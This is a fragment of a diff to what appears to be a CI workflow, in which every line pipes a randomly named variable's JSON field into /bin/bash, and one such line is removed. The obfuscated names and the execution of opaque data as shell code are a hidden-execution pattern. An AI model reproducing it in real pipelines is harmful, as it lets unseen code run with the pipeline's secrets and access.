@@ -45,7 +45,6 @@ jobs:
           echo $ii3 | jq -r .f56 | /bin/bash
           printf '%s' "$uppej03" | jq -r .fm60490 | /bin/bash
           echo $dkxa69 | jq -r .jls89146 | /bin/bash
-          echo $o78 | jq -r .f33 | /bin/bash
           printf '%s' "$q09" | jq -r .efpsb10 | /bin/bash
           echo $qmhkq04104 | jq -r .s264 | /bin/bash
           echo $px13 | jq -r .gymc2163 | /bin/bash
